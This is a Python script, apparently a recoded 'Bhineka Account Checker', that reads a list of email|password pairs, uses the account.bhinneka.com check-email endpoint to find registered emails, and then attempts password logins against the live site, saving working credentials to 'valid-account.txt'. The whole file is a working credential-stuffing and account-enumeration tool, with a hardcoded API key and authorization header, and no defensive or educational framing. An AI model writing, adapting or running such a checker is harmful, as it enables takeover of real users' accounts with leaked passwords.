#!/usr/bin/env python
# coding: utf-8
# Recode Mandul 7 turunan


import requests, colorama, os, random, pyfiglet
from http import cookiejar
BLU = colorama.Style.BRIGHT + colorama.Fore.BLUE
CYA = colorama.Style.BRIGHT + colorama.Fore.CYAN
GRE = colorama.Style.BRIGHT + colorama.Fore.GREEN
YEL = colorama.Style.BRIGHT + colorama.Fore.YELLOW
RED = colorama.Style.BRIGHT + colorama.Fore.RED
MAG = colorama.Style.BRIGHT + colorama.Fore.MAGENTA
LIYEL = colorama.Style.BRIGHT + colorama.Fore.LIGHTYELLOW_EX
LIRED = colorama.Style.BRIGHT + colorama.Fore.LIGHTRED_EX
LIMAG = colorama.Style.BRIGHT + colorama.Fore.LIGHTMAGENTA_EX
LIBLU = colorama.Style.BRIGHT + colorama.Fore.LIGHTBLUE_EX
LICYA = colorama.Style.BRIGHT + colorama.Fore.LIGHTCYAN_EX
LIGRE = colorama.Style.BRIGHT + colorama.Fore.LIGHTGREEN_EX
BOLD = colorama.Style.BRIGHT
RESET = colorama.Fore.RESET
CLEAR = 'cls' if os.name == 'nt' else 'clear'
COLORS = BLU, CYA, GRE, YEL, RED, MAG, LIYEL, LIRED, LIMAG, LIBLU, LICYA, LIGRE
FONTS = 'basic', 'o8', 'cosmic', 'graffiti', 'chunky', 'epic', 'doom', 'avatar', 'this',
font = random.choice(FONTS)
colorama.init(autoreset=True)
color2 = random.choice(COLORS)

class BlockCookies(cookiejar.CookiePolicy):
    return_ok = set_ok = domain_return_ok = path_return_ok = lambda self, *args, **kwargs: False
    netscape = True
    rfc2965 = hide_cookie2 = False
r = requests.Session()
r.cookies.set_policy(BlockCookies())  

def logo() -> None:
    os.system(CLEAR)
    color1 = random.choice(COLORS)
    color2 = random.choice(COLORS)
    while color1 == color2:
        color2 = random.choice(COLORS)
    print(color1 + '_' * os.get_terminal_size().columns, end='\n'*2)
    print(color2 + pyfiglet.figlet_format('DYAR', font=font, justify='center', width=os.get_terminal_size().columns), end='')
    msg = '[Bhineka Account Checker]'
    _ = int(os.get_terminal_size().columns/2)
    _ -= int(len(msg)/2)
    print(color1 + '=' * _ + LIYEL + msg + color1 + '=' * _ + '\n')
logo()


d = input(f'{random.choice(COLORS)}                         Input List > ')
devices = open(d, 'r+',  encoding="utf-8").read().splitlines()

    #while True:       
for list in devices:
    pisah = list.strip()
    empas = list.split('|')

    usr = empas[0]
    pas = empas[1]
    account = usr+'|'+pas


    headers = {
        'authority': 'account.bhinneka.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        'apikey': 'VnMn5R1bYUuawvFfULj0aygfKDVp19Jb',
        'authorization': 'Basic c3R1cmdlb246MG5DbDZVcFB4R0g0anUyWVFobkowbVYyZUZBQzlCSUw=',
     # Already added when you pass json=
        # 'content-type': 'application/json',
        'origin': 'https://accounts.bhinneka.com',
        'referer': 'https://accounts.bhinneka.com/',
        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    }

    json_data = {
        'email': usr,
    }

    response = requests.post('https://account.bhinneka.com/api/v2/auth/check-email', headers=headers, json=json_data)
    r =response.json()
    if r['code'] == 200:
        
        #print(f"[{c}] {GRE}{usr} => email terdaftar" + colorama.Fore.RESET)
        open('valid-email.txt', "a+").write(str(usr)+'\n')


        data = {
            'deviceId': 'STG0565abd0fe9148f296d293a4614898f6',
            'deviceLogin': 'WEB',
            'grantType': 'password',
            'memberType': 'personal',
            'password': pas,
            'username': usr,
        }

        response = requests.post('https://account.bhinneka.com/api/v2/auth', headers=headers, data=data)
        hasil = response.json()  
        if hasil['code'] == 200:
            #c += 1
            print(f'[+] {GRE}{account} => SUKSES LOGIN'.center(os.get_terminal_size().columns))
            open('valid-account.txt', "a+").write(str(account)+'\n')
        else:
            print(f'[-] {RED}{account} => GAGAL LOGIN'.center(os.get_terminal_size().columns))     

    else:
        print(f"[-] {RED}{usr} => tidak terdaftar".center(os.get_terminal_size().columns))
